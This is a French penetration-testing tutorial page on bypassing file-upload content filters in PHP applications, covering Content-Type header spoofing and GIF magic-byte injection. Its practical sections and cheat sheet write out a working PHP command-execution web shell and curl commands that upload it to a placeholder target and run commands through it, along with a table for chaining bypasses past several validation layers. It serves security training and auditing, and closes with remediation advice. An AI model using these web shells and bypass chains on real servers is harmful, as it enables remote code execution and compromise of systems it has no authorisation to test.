# Filtres de contenu

## Pourquoi

Vérifier l'extension d'un fichier ne suffit pas. On a vu dans les sections précédentes qu'un attaquant peut contourner les blacklists et les whitelists d'extensions sans trop de difficulté. Les applications modernes ajoutent donc une couche de validation sur le contenu lui-même : elles inspectent le header `Content-Type` de la requête ou analysent les premiers octets du fichier pour déterminer son type réel. Comprendre ces mécanismes permet de les contourner quand ils sont mal implémentés, et de savoir quoi recommander quand ils sont absents.

## Comment ça marche

### Filtre sur le header Content-Type

Quand on sélectionne un fichier dans le navigateur, celui-ci attribue automatiquement un `Content-Type` à la requête en fonction de l'extension du fichier. Côté serveur, certaines applications se fient à ce header pour valider le type de fichier reçu.

Voici un exemple typique de validation en PHP :

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Le problème : ce header est défini côté client. On peut le modifier librement en interceptant la requête avec un proxy comme Burp Suite.

**Identifier les Content-Types autorisés**

Avant de tenter un bypass, on peut fuzzer les valeurs acceptées. SecLists fournit une liste complète de types MIME qu'on peut filtrer :

```bash
# - Extraire uniquement les types image
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

On injecte ensuite cette liste dans Burp Intruder pour identifier les valeurs qui passent le filtre.

**Bypass**

La technique est directe : on intercepte la requête d'upload avec Burp, on conserve le contenu PHP du fichier, et on modifie le header `Content-Type` du fichier attaché en `image/jpg` (ou tout autre type autorisé).

{% hint style="info" %}
Une requête multipart d'upload contient deux headers `Content-Type` distincts. Le premier, en haut de la requête, concerne la requête HTTP elle-même. Le second, dans la section du fichier, décrit le fichier uploadé. C'est généralement ce dernier qu'il faut modifier. Dans certains cas (upload via POST brut sans multipart), un seul Content-Type est présent et c'est celui-là qu'il faut changer.
{% endhint %}

### Filtre sur le type MIME (magic bytes)

Le second mécanisme de validation inspecte directement le contenu du fichier. Chaque format de fichier possède une signature binaire dans ses premiers octets, appelée **file signature** ou **magic bytes**. Le standard MIME (Multipurpose Internet Mail Extensions) s'appuie sur ces octets pour déterminer le type réel d'un fichier.

En PHP, la fonction `mime_content_type()` effectue cette vérification :

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Ce filtre est plus robuste que le précédent car il examine le fichier lui-même, pas un header contrôlé par le client. Cependant, il reste contournable en injectant les bons magic bytes au début du fichier.

**Signatures courantes**

| Format | Magic bytes | Représentation |
|---|---|---|
| GIF | `GIF87a` ou `GIF89a` | ASCII imprimable |
| PNG | `\x89PNG\r\n\x1a\n` | Binaire |
| JPEG | `\xFF\xD8\xFF` | Binaire |
| PDF | `%PDF` | ASCII imprimable |

{% hint style="success" %}
Le format GIF est le plus simple à imiter car ses magic bytes sont des caractères ASCII imprimables. La chaîne `GIF8` est commune aux deux variantes de signatures GIF, ce qui en fait le choix par défaut pour ce type de bypass.
{% endhint %}

**Vérification locale**

La commande `file` sous Linux utilise le même mécanisme pour identifier les types de fichiers :

```bash
# - Un fichier texte avec extension .jpg reste identifié comme texte
echo "ceci est du texte" > test.jpg
file test.jpg
# test.jpg: ASCII text

# - Avec les magic bytes GIF, le type change
echo "GIF8" > test.jpg
file test.jpg
# test.jpg: GIF image data
```

**Bypass**

On ajoute les magic bytes au début du web shell pour tromper la validation MIME :

```bash
# - Créer un shell PHP qui passe la vérification MIME
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
```

Le serveur voit `GIF8` comme premier contenu et identifie le fichier comme une image GIF. Le code PHP qui suit est tout de même exécuté lors de l'inclusion.

### Combiner les bypass

En conditions réelles, une application peut empiler plusieurs filtres simultanément : validation côté client, blacklist d'extensions, whitelist d'extensions, vérification du Content-Type, et contrôle MIME. Pour contourner l'ensemble, il faut satisfaire chaque couche en une seule requête.

**Stratégie de combinaison**

| Couche | Technique |
|---|---|
| Client-side | Intercepter la requête ou désactiver le JavaScript |
| Blacklist extensions | Utiliser une extension alternative (`.phtml`, `.phar`, `.php7`) |
| Whitelist extensions | Double extension (`.phar.jpg`) ou extension inversée (`.php.jpg`) |
| Content-Type | Modifier le header en `image/gif` ou `image/jpg` |
| MIME type | Ajouter `GIF8` au début du contenu du fichier |

{% hint style="warning" %}
Toutes les combinaisons ne fonctionnent pas systématiquement. Il faut tester méthodiquement : un MIME autorisé avec un Content-Type non autorisé, un Content-Type autorisé avec une extension non autorisée, etc. L'objectif est de trouver la faille dans l'enchaînement des vérifications.
{% endhint %}

## En pratique

### Bypass du Content-Type seul

Depuis Exegol, avec Burp Suite en proxy :

```bash
# 1 - Créer le web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2 - Uploader via cURL en forçant le Content-Type
curl -s -X POST "http://<IP_CIBLE>:<PORT>/upload.php" \
     -F "uploadFile=@shell.php;type=image/gif"

# 3 - Accéder au shell
curl -s "http://<IP_CIBLE>:<PORT>/profile_images/shell.php?cmd=id"
```

### Bypass MIME avec magic bytes

```bash
# 1 - Créer un shell avec magic bytes GIF
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php

# 2 - Vérifier que le type MIME est bien GIF
file shell.php
# shell.php: GIF image data

# 3 - Uploader et exécuter
curl -s -X POST "http://<IP_CIBLE>:<PORT>/upload.php" \
     -F "uploadFile=@shell.php;type=image/gif"

curl -s "http://<IP_CIBLE>:<PORT>/profile_images/shell.php?cmd=id"
```

### Bypass complet (tous les filtres)

Quand l'application empile toutes les protections, la requête doit satisfaire chaque couche :

```bash
# 1 - Créer le fichier avec magic bytes et double extension
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.phar.jpg

# 2 - Uploader avec le bon Content-Type
curl -s -X POST "http://<IP_CIBLE>:<PORT>/upload.php" \
     -F "uploadFile=@shell.phar.jpg;type=image/gif"

# 3 - Accéder au fichier (la double extension permet l'exécution PHP si le serveur est mal configuré)
curl -s "http://<IP_CIBLE>:<PORT>/profile_images/shell.phar.jpg?cmd=id"
```

{% hint style="info" %}
L'exécution PHP sur un fichier en `.phar.jpg` dépend de la configuration Apache. Si la directive `FilesMatch` du serveur accepte `.phar` n'importe où dans le nom (pas seulement en fin), le code PHP s'exécute malgré l'extension `.jpg` finale. C'est une mauvaise configuration fréquente.
{% endhint %}

## Pièges et galères

{% tabs %}
{% tab title="Content-Type" %}
- **Mauvais header modifié** : dans une requête multipart, c'est le Content-Type du fichier (dans le boundary) qu'il faut changer, pas celui de la requête globale. Confondre les deux fait échouer le bypass.
- **Fuzzing incomplet** : ne pas se limiter à `image/jpg`. Certaines applications acceptent `image/svg+xml` ou d'autres types qui offrent des vecteurs d'attaque supplémentaires (XSS, XXE).
- **Serveur qui recalcule** : certains serveurs ignorent le Content-Type envoyé et recalculent le type à partir du contenu. Dans ce cas, modifier le header seul ne suffit pas, il faut aussi travailler les magic bytes.
{% endtab %}
{% tab title="MIME / Magic bytes" %}
- **GIF8 insuffisant** : quelques applications utilisent des vérifications plus strictes (analyse complète des headers GIF, vérification de la taille de l'image). Dans ce cas, utiliser un vrai fichier GIF valide et injecter le PHP après les headers.
- **Sortie polluée** : les magic bytes `GIF8` apparaissent dans la sortie du web shell avant le résultat de la commande. Ce n'est pas un problème fonctionnel, mais il faut en tenir compte quand on parse la réponse.
- **getimagesize()** : certaines applications PHP utilisent `getimagesize()` au lieu de `mime_content_type()`. Cette fonction vérifie que le fichier est une image valide avec des dimensions. Les simples magic bytes ne suffisent pas, il faut un fichier image réel avec du PHP injecté dans les métadonnées ou après les headers.
{% endtab %}
{% endtabs %}

## Retour terrain

En audit, les filtres de contenu sont plus fréquents que les simples vérifications d'extension, surtout sur les applications récentes. La validation du Content-Type seul est la plus facile à contourner car elle repose sur une donnée client. La validation MIME est plus robuste mais reste vulnérable à l'injection de magic bytes.

L'approche méthodique consiste à tester chaque couche de validation indépendamment : d'abord vérifier si le Content-Type est contrôlé (modifier uniquement le header), puis si le MIME est contrôlé (ajouter les magic bytes sans changer le header), et enfin combiner les deux si nécessaire. Cette démarche séquentielle permet de comprendre exactement quels filtres sont en place avant de construire le payload final.

Dans un rapport, la recommandation est de ne jamais se fier au Content-Type (donnée client), de valider le MIME côté serveur avec des fonctions robustes (`finfo_file()` plutôt que `mime_content_type()`), et surtout de ne pas stocker les fichiers dans un répertoire exécutable.

## Mémo express

| Élément | Commande / Technique |
|---|---|
| Modifier Content-Type | Intercepter avec Burp, changer en `image/gif` ou `image/jpg` |
| Créer un shell avec magic bytes | `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php` |
| Vérifier le type MIME local | `file shell.php` |
| Fuzzer les Content-Types | `cat web-all-content-types.txt \| grep 'image/' > image-types.txt` |
| Bypass complet | Magic bytes `GIF8` + Content-Type `image/gif` + double extension `.phar.jpg` |
| Upload cURL avec type forcé | `curl -F "file=@shell.php;type=image/gif" URL/upload.php` |

***
